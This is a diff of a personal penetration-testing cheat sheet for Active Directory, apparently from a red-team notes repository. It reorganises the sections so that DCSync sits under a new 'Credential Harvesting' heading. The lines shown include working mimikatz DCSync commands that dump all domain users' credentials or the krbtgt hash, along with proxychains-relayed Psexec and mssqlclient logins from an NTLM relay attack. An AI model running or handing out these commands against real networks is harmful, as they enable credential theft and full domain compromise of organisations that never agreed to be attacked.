@@ -39,8 +39,9 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Overpass-The-Hash](#overpass-the-hash-opth)
 	* [Request TGT](#request-tgt)
 	* [runas](#runas)
-	* [DCSync](#dcsync)
 	* [NTLM Relay](#ntlm-relay)
+	* [Credential Harvesing](#credential-harvesting)
+		* [DCSync](#dcsync)
 * **[Remote Authentication Between Computers](#remote-authentication-protocol)**
 	* [PSRemoting](#ps-remoting)
 	* [Winrs](#winrs)
@@ -300,15 +301,6 @@ This method will spawn a new process as the user. This wont validate your passwo
 runas /user:contoso\administrator /netonly powershell
 ```
 
-### DCSync
-```
-# Dump all available domain users
-mimikatz# lsadump::dcsync /domain:fqdn /all /csv
-
-# Dump for specific user
-mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt
-```
-
 ### NTLM Relay
 _Note: This attack will only work if SMB signing if disabled. This can be verify with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or any similar tools_
 
@@ -333,6 +325,16 @@ proxychains Psexec.py contoso/administrator:''@192.168.0.10
 
 # mssqlclient
 proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
+```
+
+### Credential Harvesting
+### DCSync
+```
+# Dump all available domain users
+mimikatz# lsadump::dcsync /domain:fqdn /all /csv
+
+# Dump for specific user
+mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt
 ```
 
 ## Remote Authentication Between Computers
